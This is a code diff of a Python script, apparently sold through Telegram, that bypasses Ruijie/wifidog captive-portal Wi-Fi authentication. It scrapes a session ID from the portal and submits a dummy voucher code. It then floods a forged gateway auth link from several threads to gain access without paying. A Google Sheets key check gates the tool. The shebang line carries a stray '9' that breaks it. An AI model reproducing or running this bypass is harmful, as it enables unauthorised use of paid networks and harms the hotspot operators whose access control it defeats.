@@ -1,5 +1,10 @@
-#!/usr/bin/env python3
+
+9#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+"""
+Turbo Network Engine v2 - With Key Approval System
+Pro Terminal Edition
+"""
 
 import requests
 import re
@@ -10,247 +15,144 @@ import logging
 import random
 import os
 import sys
-import json
-import hashlib
 from urllib.parse import urlparse, parse_qs, urljoin
-from datetime import datetime, date, timedelta
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# ===============================
-# COLOR SYSTEM (Hacker UI)
-# ===============================
-RED = "\033[91m"
-GREEN = "\033[92m"
-CYAN = "\033[96m"
-YELLOW = "\033[93m"
-MAGENTA = "\033[95m"
-WHITE = "\033[97m"
-RESET = "\033[0m"
 
 # ===============================
 # KEY APPROVAL SYSTEM
 # ===============================
 
-# Google Sheets CSV Link (Updated)
-SHEET_CSV_URL = "https://docs.google.com/spreadsheets/d/e/2PACX-1vRuFebZZ-vGXmobRjDU9C1dWRgcSjXwQ5YjK24Goh9rE0TQtoDXYaKBGWPs94_INOTUuzlXAiXAx42P/pub?output=csv"
+# Colors for approval
+black = "\033[0;30m"
+red = "\033[0;31m"
+bred = "\033[1;31m"
+green = "\033[0;32m"
+bgreen = "\033[1;32m"
+yellow = "\033[0;33m"
+byellow = "\033[1;33m"
+blue = "\033[0;34m"
+bblue = "\033[1;34m"
+purple = "\033[0;35m"
+bpurple = "\033[1;35m"
+cyan = "\033[0;36m"
+bcyan = "\033[1;36m"
+white = "\033[0;37m"
+reset = "\033[00m"
 
-LOCAL_KEYS_FILE = os.path.expanduser("~/.ruijie_approved_keys.txt")
-KEY_STORAGE_FILE = os.path.expanduser("~/.ruijie_device_key.txt")
-LICENSE_INFO_FILE = os.path.expanduser("~/.ruijie_license_info.txt")
-CACHE_EXPIRY_HOURS = 24
+# Google Sheets CSV URL
+SHEET_ID = "1bpQMfIFQGKKeDFcCbGrpFBN8bRlfndrhfj_CdrDHAcw"
+SHEET_CSV_URL = f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/export?format=csv&gid=0"
 
-# ===============================
-# LICENSE INFO MANAGEMENT (Offline support)
-# ===============================
-def save_license_info(expiry_date_str):
-    """Save license info for offline use"""
-    data = {
-        "expiry": expiry_date_str,
-        "saved_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-        "valid": True
-    }
-    try:
-        with open(LICENSE_INFO_FILE, 'w') as f:
-            json.dump(data, f)
-        return True
-    except:
-        return False
-
-def load_license_info():
-    """Load saved license info for offline use"""
-    if os.path.exists(LICENSE_INFO_FILE):
-        try:
-            with open(LICENSE_INFO_FILE, 'r') as f:
-                return json.load(f)
-        except:
-            pass
-    return None
-
-def is_license_valid_offline(expiry_date_str):
-    """Check if license is still valid (offline)"""
-    try:
-        expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d").date()
-        return date.today() <= expiry_date
-    except:
-        return False
-
-def get_days_left_offline(expiry_date_str):
-    """Get days left from saved expiry"""
-    try:
-        expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d").date()
-        days_left = (expiry_date - date.today()).days
-        return max(0, days_left)
-    except:
-        return 0
-
-# ===============================
-# STABLE SYSTEM KEY
-# ===============================
-def get_stable_system_key():
-    """Get stable system key that never changes"""
-    
-    if os.path.exists(KEY_STORAGE_FILE):
-        try:
-            with open(KEY_STORAGE_FILE, 'r') as f:
-                saved_key = f.read().strip()
-                if saved_key:
-                    return saved_key
-        except:
-            pass
-    
-    try:
-        import subprocess
-        android_id = subprocess.check_output("settings get secure android_id", shell=True).decode().strip()
-        if android_id and len(android_id) > 5:
-            stable_key = hashlib.md5(f"STABLE_{android_id}".encode()).hexdigest()[:16]
-        else:
-            import uuid
-            install_path = os.path.dirname(os.path.abspath(__file__))
-            stable_key = hashlib.md5(f"{install_path}{uuid.getnode()}".encode()).hexdigest()[:16]
-    except:
-        import random
-        import string
-        stable_key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
-    
-    try:
-        with open(KEY_STORAGE_FILE, 'w') as f:
-            f.write(stable_key)
-    except:
-        pass
-    
-    return stable_key
+# Local cache for offline approval
+LOCAL_KEYS_FILE = os.path.expanduser("~/.turbo_approved_keys.txt")
 
 def get_system_key():
-    return get_stable_system_key()
+    """Get unique system key for this device"""
+    try:
+        uid = os.geteuid()
+    except AttributeError:
+        uid = 1000
+    try:
+        username = os.getlogin()
+    except:
+        username = os.environ.get('USER', 'unknown')
+    return f"{uid}{username}"
 
-def fetch_authorized_keys_with_expiry():
-    """Fetch authorized keys with expiry dates from Google Sheets"""
-    keys_data = {}
+def fetch_authorized_keys():
+    """Fetch authorized keys from Google Sheets"""
+    keys = []
+    
+    # Try Google Sheets first
     try:
         response = requests.get(SHEET_CSV_URL, timeout=10)
         if response.status_code == 200:
             for line in response.text.strip().split('\n'):
                 line = line.strip()
-                if line and not line.startswith('keys') and not line.startswith('username'):
-                    parts = line.split(',')
-                    if len(parts) >= 1:
-                        key = parts[0].strip().strip('"')
-                        if key:
-                            expiry = parts[2].strip().strip('"') if len(parts) > 2 else ""
-                            keys_data[key] = expiry
-            if keys_data:
+                if line and not line.startswith('username') and not line.startswith('key'):
+                    key = line.split(',')[0].strip().strip('"')
+                    if key:
+                        keys.append(key)
+            
+            # Save to local cache
+            if keys:
                 try:
                     with open(LOCAL_KEYS_FILE, 'w') as f:
-                        for key, expiry in keys_data.items():
-                            f.write(f"{key},{expiry}\n")
+                        f.write('\n'.join(keys))
                 except:
                     pass
-            print(f"{GREEN}[✓] Loaded {len(keys_data)} keys from Google Sheets{RESET}")
-            return keys_data
-    except Exception as e:
-        print(f"{YELLOW}[!] Google Sheets error (offline mode): {e}{RESET}")
-    
-    try:
-        if os.path.exists(LOCAL_KEYS_FILE):
-            with open(LOCAL_KEYS_FILE, 'r') as f:
-                for line in f:
-                    line = line.strip()
-                    if line:
-                        parts = line.split(',')
-                        if len(parts) >= 1:
-                            key = parts[0]
-                            expiry = parts[1] if len(parts) > 1 else ""
-                            keys_data[key] = expiry
-            print(f"{GREEN}[✓] Loaded {len(keys_data)} keys from local cache{RESET}")
-            return keys_data
+            return keys
     except:
         pass
     
-    return {}
+    # Try local cache
+    try:
+        if os.path.exists(LOCAL_KEYS_FILE):
+            with open(LOCAL_KEYS_FILE, 'r') as f:
+                keys = [line.strip() for line in f if line.strip()]
+            return keys
+    except:
+        pass
+    
+    return keys
 
 def check_approval():
-    print(f"{MAGENTA}╔══════════════════════════════════════════════════════════════════╗")
-    print(f"║                    KEY APPROVAL SYSTEM (Hybrid)                         ║")
-    print(f"╚══════════════════════════════════════════════════════════════════╝{RESET}")
+    """Check if system key is approved"""
+    print(f"{bcyan}╔══════════════════════════════════════════════════════════════════╗")
+    print(f"║                    KEY APPROVAL SYSTEM                               ║")
+    print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
+    print(f"\n{bcyan}[!] Checking approval status...{reset}")
     
     system_key = get_system_key()
-    print(f"{WHITE}[*] System Key: {GREEN}{system_key}{RESET}")
+    authorized_keys = fetch_authorized_keys()
     
-    saved_license = load_license_info()
-    if saved_license:
-        expiry = saved_license.get('expiry')
-        if expiry and is_license_valid_offline(expiry):
-            days_left = get_days_left_offline(expiry)
-            print(f"{GREEN}[✓] LICENSE ACTIVE (Offline Mode){RESET}")
-            print(f"{GREEN}    Expires: {expiry} ({days_left} days left){RESET}")
-            print(f"{GREEN}    Turbo Engine Unlocked{RESET}")
-            time.sleep(1.5)
-            return True
-        else:
-            print(f"{RED}[✗] SAVED LICENSE EXPIRED!{RESET}")
-            print(f"{YELLOW}    Will check online for update...{RESET}")
+    print(f"{white}[*] System Key: {system_key}{reset}")
+    print(f"{white}[*] Authorized Keys: {len(authorized_keys)}{reset}")
     
-    print(f"{CYAN}[*] Checking online for license...{RESET}")
-    authorized_keys_data = fetch_authorized_keys_with_expiry()
-    
-    if system_key in authorized_keys_data:
-        expiry_date_str = authorized_keys_data[system_key]
-        
-        if expiry_date_str:
-            try:
-                expiry_date = datetime.strptime(expiry_date_str, "%Y-%m-%d").date()
-                today = date.today()
-                
-                if today > expiry_date:
-                    print(f"\n{RED}[✗] KEY EXPIRED!{RESET}")
-                    print(f"{YELLOW}Expiry date: {expiry_date_str}{RESET}")
-                    if os.path.exists(LICENSE_INFO_FILE):
-                        os.remove(LICENSE_INFO_FILE)
-                    return False
-                else:
-                    days_left = (expiry_date - today).days
-                    print(f"\n{GREEN}[✓] KEY APPROVED ✓{RESET}")
-                    print(f"{GREEN}    Expires: {expiry_date_str} ({days_left} days left){RESET}")
-                    print(f"{GREEN}    Turbo Engine Unlocked{RESET}")
-                    save_license_info(expiry_date_str)
-                    time.sleep(1.5)
-                    return True
-            except Exception as e:
-                print(f"\n{YELLOW}[!] Date parsing error: {e}{RESET}")
-                print(f"{GREEN}[✓] KEY APPROVED (No expiry check){RESET}")
-                save_license_info("2099-12-31")
-                time.sleep(1.5)
-                return True
-        else:
-            print(f"\n{GREEN}[✓] KEY APPROVED (Lifetime){RESET}")
-            print(f"{GREEN}    Turbo Engine Unlocked{RESET}")
-            save_license_info("2099-12-31")
-            time.sleep(1.5)
-            return True
+    if system_key in authorized_keys:
+        print(f"\n{bgreen}╔══════════════════════════════════════════════════════════════════╗")
+        print(f"║                    ✓ KEY APPROVED ✓                                 ║")
+        print(f"║                    Turbo Engine Unlocked                            ║")
+        print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
+        time.sleep(1.5)
+        return True
     else:
-        if saved_license:
-            expiry = saved_license.get('expiry')
-            if expiry and is_license_valid_offline(expiry):
-                days_left = get_days_left_offline(expiry)
-                print(f"\n{GREEN}[✓] USING SAVED LICENSE (Offline Mode){RESET}")
-                print(f"{GREEN}    Expires: {expiry} ({days_left} days left){RESET}")
-                print(f"{GREEN}    Turbo Engine Unlocked{RESET}")
-                time.sleep(1.5)
-                return True
-        
-        print(f"\n{RED}[✗] KEY NOT APPROVED{RESET}")
-        print(f"{YELLOW}Add '{system_key}' to Column A in Google Sheets{RESET}")
+        print(f"\n{bred}╔══════════════════════════════════════════════════════════════════╗")
+        print(f"║                    ❌ KEY NOT APPROVED ❌                           ║")
+        print(f"╠══════════════════════════════════════════════════════════════════╣")
+        print(f"║                                                                  ║")
+        print(f"║  {yellow}To buy this tool, contact:{reset}                                 ║")
+        print(f"║                                                                  ║")
+        print(f"║     {bcyan}📱 Telegram:{reset}  @jason4565999                                     ║")
+        print(f"║     {bcyan}📢 Channel:{reset}  https://t.me/sayachit2002                            ║")
+        print(f"║                                                                  ║")
+        print(f"║  {yellow}Your Key: {system_key}{reset}                                             ║")
+        print(f"║  {yellow}Send this key to buy the tool{reset}                                        ║")
+        print(f"║                                                                  ║")
+        print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
         return False
 
 # ===============================
 # CONFIG
 # ===============================
-PING_THREADS = 3
-MIN_INTERVAL = 0.3
-MAX_INTERVAL = 0.8
+PING_THREADS = 5
+MIN_INTERVAL = 0.05
+MAX_INTERVAL = 0.2
 DEBUG = False
 
+# ===============================
+# COLOR SYSTEM (Hacker UI) - Merge with approval colors
+# ===============================
+RED = red
+GREEN = green
+CYAN = cyan
+YELLOW = yellow
+MAGENTA = purple
+RESET = reset
+
+# ===============================
+# LOGGING
+# ===============================
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s | %(message)s",
@@ -259,34 +161,82 @@ logging.basicConfig(
 
 stop_event = threading.Event()
 
+# ===============================
+# INTERNET CHECK
+# ===============================
 def check_real_internet():
     try:
         return requests.get("http://www.google.com", timeout=3).status_code == 200
     except:
         return False
 
+# ===============================
+# HACKER BANNER
+# ===============================
 def banner():
     print(f"""{MAGENTA}
 ╔══════════════════════════════════════╗
-║        Ruijie All Version Bypass     ║
-║        Pro Terminal Edition          ║
+║        TURBO NETWORK ENGINE v2      ║
+║        Pro Terminal Edition         ║
+║        {GREEN}KEY APPROVED ✓{MAGENTA}                       ║
 ╚══════════════════════════════════════╝
 {RESET}""")
 
+# ===============================
+# HIGH SPEED PING THREAD
+# ===============================
 def high_speed_ping(auth_link, sid):
     session = requests.Session()
+    ping_count = 0
+    success_count = 0
+    
     while not stop_event.is_set():
         try:
-            session.get(auth_link, timeout=5)
-            print(f"{GREEN}[✓]{RESET} SID {sid} | Turbo Pulse Active     ", end="\r")
-        except:
-            print(f"{RED}[X]{RESET} Connection Lost...               ", end="\r")
-            break
+            start = time.time()
+            r = session.get(auth_link, timeout=5)
+            elapsed = (time.time() - start) * 1000
+            ping_count += 1
+            success_count += 1
+            
+            # Color based on latency
+            if elapsed < 50:
+                color = GREEN
+            elif elapsed < 100:
+                color = YELLOW
+            else:
+                color = RED
+            
+            print(f"{color}[✓]{RESET} SID {sid} | Ping: {elapsed:.1f}ms | Success: {success_count}/{ping_count}", end="\r")
+            
+        except requests.exceptions.Timeout:
+            ping_count += 1
+            print(f"{RED}[X]{RESET} SID {sid} | TIMEOUT | Success: {success_count}/{ping_count}", end="\r")
+        except requests.exceptions.ConnectionError:
+            ping_count += 1
+            print(f"{RED}[X]{RESET} SID {sid} | Connection Lost | Success: {success_count}/{ping_count}", end="\r")
+        except Exception as e:
+            if DEBUG:
+                print(f"{RED}[!]{RESET} Error: {e}", end="\r")
+        
         time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))
 
+# ===============================
+# MAIN PROCESS
+# ===============================
 def start_process():
+    """Main turbo engine process"""
+    os.system('clear' if os.name == 'posix' else 'cls')
     banner()
     logging.info(f"{CYAN}Initializing Turbo Engine...{RESET}")
+    
+    # Show network status
+    print(f"\n{CYAN}[*] Network Status:{RESET}")
+    print(f"    Checking internet connectivity...")
+    
+    if check_real_internet():
+        print(f"    {GREEN}[✓] Internet is already active{RESET}")
+    
+    print(f"\n{CYAN}[*] Starting portal detection...{RESET}")
 
     while not stop_event.is_set():
         session = requests.Session()
@@ -295,6 +245,7 @@ def start_process():
         try:
             r = requests.get(test_url, allow_redirects=True, timeout=5)
 
+            # Check if already connected
             if r.url == test_url:
                 if check_real_internet():
                     print(f"{YELLOW}[•]{RESET} Internet Already Active... Waiting     ", end="\r")
@@ -305,8 +256,9 @@ def start_process():
             parsed_portal = urlparse(portal_url)
             portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
 
-            print(f"\n{CYAN}[*] Captive Portal Detected{RESET}")
+            print(f"\n{CYAN}[*] Captive Portal Detected: {portal_host}{RESET}")
 
+            # STEP 1 - Extract SID
             r1 = session.get(portal_url, verify=False, timeout=10)
             path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
             next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
@@ -325,15 +277,21 @@ def start_process():
 
             print(f"{GREEN}[✓]{RESET} Session ID Captured: {sid}")
 
+            # STEP 2 - Optional Voucher Test
+            print(f"{CYAN}[*] Checking Voucher Endpoint...{RESET}")
+            voucher_api = f"{portal_host}/api/auth/voucher/"
+
             try:
-                voucher_api = f"{portal_host}/api/auth/voucher/"
                 v_res = session.post(
-                    voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1},
+                    voucher_api,
+                    json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1},
                     timeout=5
                 )
+                print(f"{GREEN}[✓]{RESET} Voucher API Status: {v_res.status_code}")
             except:
-                pass
+                print(f"{YELLOW}[!]{RESET} Voucher Endpoint Skipped")
 
+            # STEP 3 - Build Auth Link
             params = parse_qs(parsed_portal.query)
             gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
             gw_port = params.get('gw_port', ['2060'])[0]
@@ -341,27 +299,51 @@ def start_process():
             auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
 
             print(f"{MAGENTA}[*] Launching {PING_THREADS} Turbo Threads...{RESET}")
+            print(f"{CYAN}[*] Target: {gw_addr}:{gw_port}{RESET}")
+            print(f"{YELLOW}[!] Press Ctrl+C to stop{RESET}\n")
 
-            for _ in range(PING_THREADS):
-                threading.Thread(
+            # Start ping threads
+            threads = []
+            for i in range(PING_THREADS):
+                t = threading.Thread(
                     target=high_speed_ping,
                     args=(auth_link, sid),
                     daemon=True
-                ).start()
+                )
+                t.start()
+                threads.append(t)
 
-            while check_real_internet():
-                time.sleep(5)
+            # Monitor internet connection
+            last_status = False
+            while not stop_event.is_set():
+                is_connected = check_real_internet()
+                
+                if is_connected and not last_status:
+                    print(f"\n{GREEN}[✓] Internet Connected!{RESET}")
+                elif not is_connected and last_status:
+                    print(f"\n{RED}[X] Internet Disconnected! Reconnecting...{RESET}")
+                
+                last_status = is_connected
+                time.sleep(2)
 
+        except KeyboardInterrupt:
+            raise
         except Exception as e:
             if DEBUG:
                 logging.error(f"{RED}Error: {e}{RESET}")
             time.sleep(5)
 
+# ===============================
+# ENTRY POINT WITH APPROVAL
+# ===============================
 if __name__ == "__main__":
+    # Check for key display
     if len(sys.argv) > 1 and sys.argv[1] == "--key":
         print(f"\n{GREEN}Your System Key: {get_system_key()}{RESET}")
+        print(f"{YELLOW}Send this key to @paing07709 to purchase{RESET}")
         sys.exit(0)
     
+    # Normal mode with approval check
     if check_approval():
         try:
             start_process()
